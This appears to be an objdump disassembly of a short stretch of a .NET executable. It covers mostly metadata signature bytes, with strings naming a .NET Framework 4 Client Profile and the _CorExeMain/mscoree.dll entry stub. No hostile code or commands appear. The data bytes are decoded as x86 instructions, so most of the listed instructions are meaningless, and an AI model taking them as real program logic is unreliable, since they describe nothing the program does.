  40c1b4:	65 77 6f             	gs ja  0x40c226
  40c1b7:	72 6b                	jb     0x40c224
  40c1b9:	20 34 20             	and    %dh,(%eax,%eiz,1)
  40c1bc:	43                   	inc    %ebx
  40c1bd:	6c                   	insb   (%dx),%es:(%edi)
  40c1be:	69 65 6e 74 20 50 72 	imul   $0x72502074,0x6e(%ebp),%esp
  40c1c5:	6f                   	outsl  %ds:(%esi),(%dx)
  40c1c6:	66 69 6c 65 09 01 00 	imul   $0x1,0x9(%ebp,%eiz,2),%bp
  40c1cd:	04 49                	add    $0x49,%al
  40c1cf:	74 65                	je     0x40c236
  40c1d1:	6d                   	insl   (%dx),%es:(%edi)
  40c1d2:	00 00                	add    %al,(%eax)
  40c1d4:	03 07                	add    (%edi),%eax
  40c1d6:	01 08                	add    %ecx,(%eax)
  40c1d8:	04 00                	add    $0x0,%al
  40c1da:	01 08                	add    %ecx,(%eax)
  40c1dc:	0e                   	push   %cs
  40c1dd:	03 07                	add    (%edi),%eax
  40c1df:	01 02                	add    %eax,(%edx)
  40c1e1:	05 00 00 12 80       	add    $0x80120000,%eax
  40c1e6:	b1 05                	mov    $0x5,%cl
  40c1e8:	20 01                	and    %al,(%ecx)
  40c1ea:	0e                   	push   %cs
  40c1eb:	1d 05 05 20 00       	sbb    $0x200505,%eax
  40c1f0:	12 80 b5 05 20 00    	adc    0x2005b5(%eax),%al
  40c1f6:	12 80 b9 05 20 01    	adc    0x12005b9(%eax),%al
  40c1fc:	1d 05 0e 08 20       	sbb    $0x20080e05,%eax
  40c201:	03 02                	add    (%edx),%eax
  40c203:	1d 05 0e 1d 05       	sbb    $0x51d0e05,%eax
  40c208:	14 07                	adc    $0x7,%al
  40c20a:	08 0e                	or     %cl,(%esi)
  40c20c:	08 1d 12 80 c9 08    	or     %bl,0x8c98012
  40c212:	12 80 c9 12 80 cd    	adc    -0x327fed37(%eax),%al
  40c218:	12 80 d1 1d 0e 0c    	adc    0xc0e1dd1(%eax),%al
  40c21e:	20 03                	and    %al,(%ebx)
  40c220:	01 11                	add    %edx,(%ecx)
  40c222:	80 d5 11             	adc    $0x11,%ch
  40c225:	80 d9 11             	sbb    $0x11,%cl
  40c228:	80 dd 05             	sbb    $0x5,%ch
  40c22b:	00 02                	add    %al,(%edx)
  40c22d:	02 0e                	add    (%esi),%cl
  40c22f:	0e                   	push   %cs
  40c230:	06                   	push   %es
  40c231:	20 01                	and    %al,(%ecx)
  40c233:	1d 0e 1d 03 04       	sbb    $0x4031d0e,%eax
  40c238:	20 01                	and    %al,(%ecx)
  40c23a:	08 08                	or     %cl,(%eax)
  40c23c:	07                   	pop    %es
  40c23d:	00 01                	add    %al,(%ecx)
  40c23f:	1d 12 80 c9 0e       	sbb    $0xec98012,%eax
  40c244:	07                   	pop    %es
  40c245:	20 02                	and    %al,(%edx)
  40c247:	01 12                	add    %edx,(%edx)
  40c249:	80 c9 08             	or     $0x8,%cl
  40c24c:	06                   	push   %es
  40c24d:	20 01                	and    %al,(%ecx)
  40c24f:	01 12                	add    %edx,(%edx)
  40c251:	80 f1 09             	xor    $0x9,%cl
  40c254:	20 02                	and    %al,(%edx)
  40c256:	1d 0e 1d 0e 11       	sbb    $0x110e1d0e,%eax
  40c25b:	80 f5 05             	xor    $0x5,%ch
  40c25e:	20 02                	and    %al,(%edx)
  40c260:	08 08                	or     %cl,(%eax)
  40c262:	08 06                	or     %al,(%esi)
  40c264:	20 02                	and    %al,(%edx)
  40c266:	01 12                	add    %edx,(%edx)
  40c268:	0d 02 05 20 02       	or     $0x2200502,%eax
  40c26d:	01 1c 18             	add    %ebx,(%eax,%ebx,1)
  40c270:	09 20                	or     %esp,(%eax)
  40c272:	03 01                	add    (%ecx),%eax
  40c274:	12 61 02             	adc    0x2(%ecx),%ah
  40c277:	12 81 01 05 20 00    	adc    0x200501(%ecx),%al
  40c27d:	12 81 05 0b 20 04    	adc    0x4200b05(%ecx),%al
  40c283:	01 0e                	add    %ecx,(%esi)
  40c285:	12 81 09 11 81 0d    	adc    0xd811109(%ecx),%al
  40c28b:	02 09                	add    (%ecx),%cl
  40c28d:	20 04 01             	and    %al,(%ecx,%eax,1)
  40c290:	12 81 15 1c 08 08    	adc    0x8081c15(%ecx),%al
  40c296:	0c 20                	or     $0x20,%al
  40c298:	05 12 25 1d 05       	add    $0x51d2512,%eax
  40c29d:	08 08                	or     %cl,(%eax)
  40c29f:	12 81 19 1c 06 00    	adc    0x61c19(%ecx),%al
  40c2a5:	01 11                	add    %edx,(%ecx)
  40c2a7:	81 21 0e 05 20 01    	andl   $0x120050e,(%ecx)
  40c2ad:	02 12                	add    (%edx),%dl
  40c2af:	19 04 07             	sbb    %eax,(%edi,%eax,1)
  40c2b2:	02 08                	add    (%eax),%cl
  40c2b4:	08 05 20 01 08 12    	or     %al,0x12080120
  40c2ba:	25 06 00 02 08       	and    $0x8020006,%eax
  40c2bf:	1d 05 08 07 20       	sbb    $0x20070805,%eax
  40c2c4:	03 08                	add    (%eax),%ecx
  40c2c6:	1d 05 08 08 06       	sbb    $0x6080805,%eax
  40c2cb:	20 01                	and    %al,(%ecx)
  40c2cd:	01 12                	add    %edx,(%edx)
  40c2cf:	81 29 04 20 01 01    	subl   $0x1012004,(%ecx)
  40c2d5:	1c 0c                	sbb    $0xc,%al
  40c2d7:	07                   	pop    %es
  40c2d8:	06                   	push   %es
  40c2d9:	1c 02                	sbb    $0x2,%al
  40c2db:	1d 05 12 81 2d       	sbb    $0x2d811205,%eax
  40c2e0:	08 1d 05 06 00 02    	or     %bl,0x2000605
  40c2e6:	01 1c 10             	add    %ebx,(%eax,%edx,1)
  40c2e9:	02 07                	add    (%edi),%al
  40c2eb:	20 02                	and    %al,(%edx)
  40c2ed:	02 08                	add    (%eax),%cl
  40c2ef:	11 81 35 07 20 03    	adc    %eax,0x3200735(%ecx)
  40c2f5:	01 1d 05 08 08 1a    	add    %ebx,0x1a080805
  40c2fb:	07                   	pop    %es
  40c2fc:	0a 12                	or     (%edx),%dl
  40c2fe:	81 3d 0e 1d 12 81 41 	cmpl   $0x81120841,0x81121d0e
  40c305:	08 12 81 
  40c308:	41                   	inc    %ecx
  40c309:	12 81 45 12 81 49    	adc    0x49811245(%ecx),%al
  40c30f:	1d 05 0e 12 81       	sbb    $0x81120e05,%eax
  40c314:	4d                   	dec    %ebp
  40c315:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40c31a:	0e                   	push   %cs
  40c31b:	05 00 00 12 81       	add    $0x81120000,%eax
  40c320:	41                   	inc    %ecx
  40c321:	05 20 00 12 81       	add    $0x81120020,%eax
  40c326:	55                   	push   %ebp
  40c327:	06                   	push   %es
  40c328:	00 00                	add    %al,(%eax)
  40c32a:	1d 12 81 41 05       	sbb    $0x5418112,%eax
  40c32f:	00 01                	add    %al,(%ecx)
  40c331:	0e                   	push   %cs
  40c332:	1d 0e 06 20 01       	sbb    $0x120060e,%eax
  40c337:	01 11                	add    %edx,(%ecx)
  40c339:	81 5d 08 00 01 12 81 	sbbl   $0x81120100,0x8(%ebp)
  40c340:	41                   	inc    %ecx
  40c341:	12 81 45 04 06 12    	adc    0x12060445(%ecx),%al
  40c347:	81 49 09 20 02 12 81 	orl    $0x81120220,0x9(%ecx)
  40c34e:	49                   	dec    %ecx
  40c34f:	0e                   	push   %cs
  40c350:	11 81 69 06 00 03    	adc    %eax,0x3000669(%ecx)
  40c356:	0e                   	push   %cs
  40c357:	0e                   	push   %cs
  40c358:	0e                   	push   %cs
  40c359:	0e                   	push   %cs
  40c35a:	05 20 02 01 0e       	add    $0xe010220,%eax
  40c35f:	1c 07                	sbb    $0x7,%al
  40c361:	20 02                	and    %al,(%edx)
  40c363:	01 0e                	add    %ecx,(%esi)
  40c365:	11 81 75 04 07 02    	adc    %eax,0x2070475(%ecx)
  40c36b:	0a 02                	or     (%edx),%al
  40c36d:	10 07                	adc    %al,(%edi)
  40c36f:	06                   	push   %es
  40c370:	12 81 85 12 81 89    	adc    -0x767eed7b(%ecx),%al
  40c376:	12 81 8d 12 81 91    	adc    -0x6e7eed73(%ecx),%al
  40c37c:	0e                   	push   %cs
  40c37d:	02 05 20 00 12 81    	add    0x81120020,%al
  40c383:	89 05 20 00 12 81    	mov    %eax,0x81120020
  40c389:	8d 05 20 00 12 81    	lea    0x81120020,%eax
  40c38f:	91                   	xchg   %eax,%ecx
  40c390:	04 20                	add    $0x20,%al
  40c392:	01 1c 0e             	add    %ebx,(%esi,%ecx,1)
  40c395:	04 07                	add    $0x7,%al
  40c397:	02 02                	add    (%edx),%al
  40c399:	02 03                	add    (%ebx),%al
  40c39b:	20 00                	and    %al,(%eax)
  40c39d:	18 04 07             	sbb    %al,(%edi,%eax,1)
  40c3a0:	02 18                	add    (%eax),%bl
  40c3a2:	02 03                	add    (%ebx),%al
  40c3a4:	07                   	pop    %es
  40c3a5:	01 0e                	add    %ecx,(%esi)
  40c3a7:	05 00 00 12 81       	add    $0x81120000,%eax
  40c3ac:	9d                   	popf
  40c3ad:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40c3b2:	1c 0a                	sbb    $0xa,%al
  40c3b4:	07                   	pop    %es
  40c3b5:	05 1d 05 12 35       	add    $0x3512051d,%eax
  40c3ba:	1d 05 08 05 05       	sbb    $0x5050805,%eax
  40c3bf:	20 01                	and    %al,(%ecx)
  40c3c1:	12 35 0e 05 20 02    	adc    0x220050e,%dh
  40c3c7:	0e                   	push   %cs
  40c3c8:	08 08                	or     %cl,(%eax)
  40c3ca:	06                   	push   %es
  40c3cb:	07                   	pop    %es
  40c3cc:	02 02                	add    (%edx),%al
  40c3ce:	11 81 ad 05 20 02    	adc    %eax,0x22005ad(%ecx)
  40c3d4:	0e                   	push   %cs
  40c3d5:	0e                   	push   %cs
  40c3d6:	0e                   	push   %cs
  40c3d7:	05 20 00 11 81       	add    $0x81110020,%eax
  40c3dc:	ad                   	lods   %ds:(%esi),%eax
  40c3dd:	05 00 00 12 81       	add    $0x81120000,%eax
  40c3e2:	b9 06 20 01 01       	mov    $0x1012006,%ecx
  40c3e7:	12 81 b9 06 20 01    	adc    0x12006b9(%ecx),%al
  40c3ed:	02 11                	add    (%ecx),%dl
  40c3ef:	81 c1 11 07 05 12    	add    $0x12050711,%ecx
  40c3f5:	81 85 15 12 41 01 0e 	addl   $0x8d81120e,0x1411215(%ebp)
  40c3fc:	12 81 8d 
  40c3ff:	12 81 91 0e 05 15    	adc    0x15050e91(%ecx),%al
  40c405:	12 41 01             	adc    0x1(%ecx),%al
  40c408:	0e                   	push   %cs
  40c409:	05 20 01 01 13       	add    $0x13010120,%eax
  40c40e:	00 05 20 00 1d 13    	add    %al,0x131d0020
  40c414:	00 06                	add    %al,(%esi)
  40c416:	00 02                	add    %al,(%edx)
  40c418:	0e                   	push   %cs
  40c419:	0e                   	push   %cs
  40c41a:	1d 0e 08 07 03       	sbb    $0x307080e,%eax
  40c41f:	1d 12 29 08 12       	sbb    $0x12082912,%eax
  40c424:	29 05 00 00 1d 12    	sub    %eax,0x121d0000
  40c42a:	29 05 20 00 11 81    	sub    %eax,0x81110020
  40c430:	c5 09                	lds    (%ecx),%ecx
  40c432:	00 02                	add    %al,(%edx)
  40c434:	02 11                	add    (%ecx),%dl
  40c436:	81 c5 11 81 c5 05    	add    $0x5c58111,%ebp
  40c43c:	07                   	pop    %es
  40c43d:	02 12                	add    (%edx),%dl
  40c43f:	35 0e 07 20 03       	xor    $0x320070e,%eax
  40c444:	01 02                	add    %eax,(%edx)
  40c446:	0e                   	push   %cs
  40c447:	10 02                	adc    %al,(%edx)
  40c449:	06                   	push   %es
  40c44a:	00 01                	add    %al,(%ecx)
  40c44c:	01 12                	add    %edx,(%edx)
  40c44e:	81 cd 06 07 02 12    	or     $0x12020706,%ebp
  40c454:	81 49 02 08 20 03 01 	orl    $0x1032008,0x2(%ecx)
  40c45b:	0e                   	push   %cs
  40c45c:	1c 11                	sbb    $0x11,%al
  40c45e:	81 d5 07 07 02 12    	adc    $0x12020707,%ebp
  40c464:	81 49 1d 05 06 20 01 	orl    $0x1200605,0x1d(%ecx)
  40c46b:	12 81 49 0e 02 1d    	adc    0x1d020e49(%ecx),%al
  40c471:	05 07 20 02 12       	add    $0x12022007,%eax
  40c476:	81 49 0e 02 0e 07 04 	orl    $0x4070e02,0xe(%ecx)
  40c47d:	12 60 0e             	adc    0xe(%eax),%ah
  40c480:	15 11 81 d9 01       	adc    $0x1d98111,%eax
  40c485:	12 60 12             	adc    0x12(%eax),%ah
  40c488:	60                   	pusha
  40c489:	06                   	push   %es
  40c48a:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c48f:	60                   	pusha
  40c490:	10 10                	adc    %dl,(%eax)
  40c492:	01 01                	add    %eax,(%ecx)
  40c494:	15 12 41 01 1e       	adc    $0x1e014112,%eax
  40c499:	00 15 12 81 e1 01    	add    %dl,0x1e18112
  40c49f:	1e                   	push   %ds
  40c4a0:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40c4a3:	01 12                	add    %edx,(%edx)
  40c4a5:	60                   	pusha
  40c4a6:	09 20                	or     %esp,(%eax)
  40c4a8:	00 15 11 81 d9 01    	add    %dl,0x1d98111
  40c4ae:	13 00                	adc    (%eax),%eax
  40c4b0:	07                   	pop    %es
  40c4b1:	15 11 81 d9 01       	adc    $0x1d98111,%eax
  40c4b6:	12 60 04             	adc    0x4(%eax),%ah
  40c4b9:	20 00                	and    %al,(%eax)
  40c4bb:	13 00                	adc    (%eax),%eax
  40c4bd:	05 20 01 02 13       	add    $0x13020120,%eax
  40c4c2:	00 03                	add    %al,(%ebx)
  40c4c4:	07                   	pop    %es
  40c4c5:	01 1c 05 00 00 12 81 	add    %ebx,-0x7eee0000(,%eax,1)
  40c4cc:	e5 07                	in     $0x7,%eax
  40c4ce:	20 01                	and    %al,(%ecx)
  40c4d0:	12 81 e9 1d 05 06    	adc    0x6051de9(%ecx),%al
  40c4d6:	20 01                	and    %al,(%ecx)
  40c4d8:	12 81 ed 0e 06 00    	adc    0x60eed(%ecx),%al
  40c4de:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40c4e1:	81 ed 08 00 01 12    	sub    $0x12010008,%ebp
  40c4e7:	81 ed 11 81 f5 09    	sub    $0x9f58111,%ebp
  40c4ed:	00 02                	add    %al,(%edx)
  40c4ef:	12 81 f9 11 81 fd    	adc    -0x27eee07(%ecx),%al
  40c4f5:	0e                   	push   %cs
  40c4f6:	1c 00                	sbb    $0x0,%al
  40c4f8:	05 12 82 05 11       	add    $0x11058212,%eax
  40c4fd:	82 09 0e             	orb    $0xe,(%ecx)
  40c500:	15 12 81 e1 01       	adc    $0x1e18112,%eax
  40c505:	12 81 ed 12 81 ed    	adc    -0x127eed13(%ecx),%al
  40c50b:	15 12 81 e1 01       	adc    $0x1e18112,%eax
  40c510:	12 81 f9 17 15 12    	adc    0x121517f9(%ecx),%al
  40c516:	45                   	inc    %ebp
  40c517:	01 15 12 49 0a 12    	add    %edx,0x120a4912
  40c51d:	4d                   	dec    %ebp
  40c51e:	1c 12                	sbb    $0x12,%al
  40c520:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40c525:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40c52a:	0e                   	push   %cs
  40c52b:	0b 00                	or     (%eax),%eax
  40c52d:	01 15 12 45 01 13    	add    %edx,0x13014512
  40c533:	00 12                	add    %dl,(%edx)
  40c535:	82 05 03 06 13 00 13 	addb   $0x13,0x130603
  40c53c:	15 12 49 0a 12       	adc    $0x120a4912,%eax
  40c541:	4d                   	dec    %ebp
  40c542:	1c 12                	sbb    $0x12,%al
  40c544:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40c549:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40c54e:	0e                   	push   %cs
  40c54f:	17                   	pop    %ss
  40c550:	20 0a                	and    %cl,(%edx)
  40c552:	01 13                	add    %edx,(%ebx)
  40c554:	00 13                	add    %dl,(%ebx)
  40c556:	01 13                	add    %edx,(%ebx)
  40c558:	02 13                	add    (%ebx),%dl
  40c55a:	03 13                	add    (%ebx),%edx
  40c55c:	04 13                	add    $0x13,%al
  40c55e:	05 13 06 13 07       	add    $0x7130613,%eax
  40c563:	13 08                	adc    (%eax),%ecx
  40c565:	13 09                	adc    (%ecx),%ecx
  40c567:	05 07 01 12 82       	add    $0x82120107,%eax
  40c56c:	0d 07 20 03 01       	or     $0x1032007,%eax
  40c571:	0e                   	push   %cs
  40c572:	1d 05 08 05 20       	sbb    $0x20050805,%eax
  40c577:	01 1d 05 08 12 07    	add    %ebx,0x7120805
  40c57d:	06                   	push   %es
  40c57e:	12 81 2d 12 82 19    	adc    0x1982122d(%ecx),%al
  40c584:	12 82 1d 12 82 21    	adc    0x2182121d(%edx),%al
  40c58a:	1d 05 1d 05 06       	sbb    $0x6051d05,%eax
  40c58f:	20 01                	and    %al,(%ecx)
  40c591:	01 11                	add    %edx,(%ecx)
  40c593:	82 2d 06 20 01 01 11 	subb   $0x11,0x1012006
  40c59a:	82 31 05             	xorb   $0x5,(%ecx)
  40c59d:	20 00                	and    %al,(%eax)
  40c59f:	12 82 35 0b 20 03    	adc    0x3200b35(%edx),%al
  40c5a5:	01 12                	add    %edx,(%edx)
  40c5a7:	61                   	popa
  40c5a8:	12 82 35 11 82 39    	adc    0x39821135(%edx),%al
  40c5ae:	08 20                	or     %ah,(%eax)
  40c5b0:	03 1d 05 1d 05 08    	add    0x8051d05,%ebx
  40c5b6:	08 1a                	or     %bl,(%edx)
  40c5b8:	07                   	pop    %es
  40c5b9:	0a 12                	or     (%edx),%dl
  40c5bb:	81 2d 12 82 19 12 82 	subl   $0x51d2182,0x12198212
  40c5c2:	21 1d 05 
  40c5c5:	1d 05 1d 05 12       	sbb    $0x12051d05,%eax
  40c5ca:	82 1d 1d 05 1d 05 1d 	sbbb   $0x1d,0x51d051d
  40c5d1:	05 0c 00 05 01       	add    $0x105000c,%eax
  40c5d6:	12 82 45 08 12 82    	adc    -0x7dedf7bb(%edx),%al
  40c5dc:	45                   	inc    %ebp
  40c5dd:	08 08                	or     %cl,(%eax)
  40c5df:	04 07                	add    $0x7,%al
  40c5e1:	02 02                	add    (%edx),%al
  40c5e3:	08 09                	or     %cl,(%ecx)
  40c5e5:	00 02                	add    %al,(%edx)
  40c5e7:	01 12                	add    %edx,(%edx)
  40c5e9:	82 45 11 82          	addb   $0x82,0x11(%ebp)
  40c5ed:	4d                   	dec    %ebp
  40c5ee:	0d 07 06 1d 05       	or     $0x51d0607,%eax
  40c5f3:	12 82 51 12 35 1d    	adc    0x1d351251(%edx),%al
  40c5f9:	05 08 05 07 07       	add    $0x7070508,%eax
  40c5fe:	02 12                	add    (%edx),%dl
  40c600:	82 51 1d 05          	adcb   $0x5,0x1d(%ecx)
  40c604:	08 07                	or     %al,(%edi)
  40c606:	04 12                	add    $0x12,%al
  40c608:	35 1d 05 08 05       	xor    $0x508051d,%eax
  40c60d:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40c612:	1c 06                	sbb    $0x6,%al
  40c614:	07                   	pop    %es
  40c615:	03 1d 05 08 08 05    	add    0x5080805,%ebx
  40c61b:	20 01                	and    %al,(%ecx)
  40c61d:	13 00                	adc    (%eax),%eax
  40c61f:	08 04 07             	or     %al,(%edi,%eax,1)
  40c622:	01 12                	add    %edx,(%edx)
  40c624:	60                   	pusha
  40c625:	0e                   	push   %cs
  40c626:	07                   	pop    %es
  40c627:	05 08 08 0e 15       	add    $0x150e0808,%eax
  40c62c:	11 81 d9 01 12 60    	adc    %eax,0x601201d9(%ecx)
  40c632:	12 60 07             	adc    0x7(%eax),%ah
  40c635:	07                   	pop    %es
  40c636:	04 08                	add    $0x8,%al
  40c638:	05 1d 05 08 04       	add    $0x408051d,%eax
  40c63d:	20 01                	and    %al,(%ecx)
  40c63f:	01 05 04 07 01 11    	add    %eax,0x11010704
  40c645:	64 04 00             	fs add $0x0,%al
  40c648:	01 0b                	add    %ecx,(%ebx)
  40c64a:	0a 04 00             	or     (%eax,%eax,1),%al
  40c64d:	01 0b                	add    %ecx,(%ebx)
  40c64f:	0e                   	push   %cs
  40c650:	04 00                	add    $0x0,%al
  40c652:	01 0b                	add    %ecx,(%ebx)
  40c654:	0d 04 00 01 0b       	or     $0xb010004,%eax
  40c659:	0c 06                	or     $0x6,%al
  40c65b:	00 01                	add    %al,(%ecx)
  40c65d:	0b 11                	or     (%ecx),%edx
  40c65f:	81 ad 04 00 01 0a 0a 	subl   $0x100040a,0xa010004(%ebp)
  40c666:	04 00 01 
  40c669:	0a 0e                	or     (%esi),%cl
  40c66b:	04 00                	add    $0x0,%al
  40c66d:	01 0a                	add    %ecx,(%edx)
  40c66f:	0d 04 00 01 0a       	or     $0xa010004,%eax
  40c674:	0c 06                	or     $0x6,%al
  40c676:	00 01                	add    %al,(%ecx)
  40c678:	0a 11                	or     (%ecx),%dl
  40c67a:	81 ad 04 00 01 0d 0a 	subl   $0x100040a,0xd010004(%ebp)
  40c681:	04 00 01 
  40c684:	0d 0e 07 07 02       	or     $0x207070e,%eax
  40c689:	11 64 11 81          	adc    %esp,-0x7f(%ecx,%edx,1)
  40c68d:	ad                   	lods   %ds:(%esi),%eax
  40c68e:	05 00 01 1d 05       	add    $0x51d0100,%eax
  40c693:	0c 07                	or     $0x7,%al
  40c695:	07                   	pop    %es
  40c696:	02 1d 05 12 81 71    	add    0x71811205,%bl
  40c69c:	0d 20 04 01 0e       	or     $0xe010420,%eax
  40c6a1:	11 81 75 11 82 61    	adc    %eax,0x61821175(%ecx)
  40c6a7:	11 82 65 0b 07 06    	adc    %eax,0x6070b65(%edx)
  40c6ad:	12 60 1d             	adc    0x1d(%eax),%ah
  40c6b0:	0e                   	push   %cs
  40c6b1:	0e                   	push   %cs
  40c6b2:	08 12                	or     %dl,(%edx)
  40c6b4:	60                   	pusha
  40c6b5:	08 05 07 01 12 81    	or     %al,0x81120107
  40c6bb:	2d 05 07 01 12       	sub    $0x12010705,%eax
  40c6c0:	81 71 07 07 04 05 1d 	xorl   $0x1d050407,0x7(%ecx)
  40c6c7:	05 08 08 06 00       	add    $0x60808,%eax
  40c6cc:	02 07                	add    (%edi),%al
  40c6ce:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40c6d3:	02 0c 1d 05 08 06 00 	add    0x60805(,%ebx,1),%cl
  40c6da:	02 0d 1d 05 08 06    	add    0x608051d,%cl
  40c6e0:	00 02                	add    %al,(%edx)
  40c6e2:	09 1d 05 08 06 00    	or     %ebx,0x60805
  40c6e8:	02 0b                	add    (%ebx),%cl
  40c6ea:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40c6ef:	02 06                	add    (%esi),%al
  40c6f1:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40c6f6:	02 0a                	add    (%edx),%cl
  40c6f8:	1d 05 08 09 07       	sbb    $0x7090805,%eax
  40c6fd:	03 12                	add    (%edx),%edx
  40c6ff:	81 2d 1d 05 1d 05 05 	subl   $0x12020705,0x51d051d
  40c706:	07 02 12 
  40c709:	60                   	pusha
  40c70a:	02 04 07             	add    (%edi,%eax,1),%al
  40c70d:	01 1d 05 05 07 02    	add    %ebx,0x2070505
  40c713:	1d 05 08 08 07       	sbb    $0x7080805,%eax
  40c718:	04 1d                	add    $0x1d,%al
  40c71a:	05 1d 05 08 05       	add    $0x508051d,%eax
  40c71f:	06                   	push   %es
  40c720:	07                   	pop    %es
  40c721:	03 1d 05 08 05 05    	add    0x5050805,%ebx
  40c727:	00 01                	add    %al,(%ecx)
  40c729:	1d 05 0b 0f 07       	sbb    $0x70f0b05,%eax
  40c72e:	06                   	push   %es
  40c72f:	12 81 2d 1d 05 08    	adc    0x8051d2d(%ecx),%al
  40c735:	12 82 69 1d 05 1d    	adc    0x1d051d69(%edx),%al
  40c73b:	05 08 20 02 01       	add    $0x1022008,%eax
  40c740:	12 61 11             	adc    0x11(%ecx),%ah
  40c743:	82 6d 0c 07          	subb   $0x7,0xc(%ebp)
  40c747:	04 12                	add    $0x12,%al
  40c749:	81 2d 1d 05 12 82 69 	subl   $0x51d69,0x8212051d
  40c750:	1d 05 00 
  40c753:	00 7c c7 00          	add    %bh,0x0(%edi,%eax,8)
	...
  40c75f:	00 9e c7 00 00 00    	add    %bl,0xc7(%esi)
  40c765:	20 00                	and    %al,(%eax)
	...
  40c77b:	00 90 c7 00 00 00    	add    %dl,0xc7(%eax)
	...
  40c791:	00 5f 43             	add    %bl,0x43(%edi)
  40c794:	6f                   	outsl  %ds:(%esi),(%dx)
  40c795:	72 45                	jb     0x40c7dc
  40c797:	78 65                	js     0x40c7fe
  40c799:	4d                   	dec    %ebp
  40c79a:	61                   	popa
  40c79b:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40c7a2:	72 65                	jb     0x40c809
  40c7a4:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40c7a8:	6c                   	insb   (%dx),%es:(%edi)
  40c7a9:	00 00                	add    %al,(%eax)
  40c7ab:	00 00                	add    %al,(%eax)
  40c7ad:	00 ff                	add    %bh,%bh
  40c7af:	25 00 20 40 00       	and    $0x402000,%eax
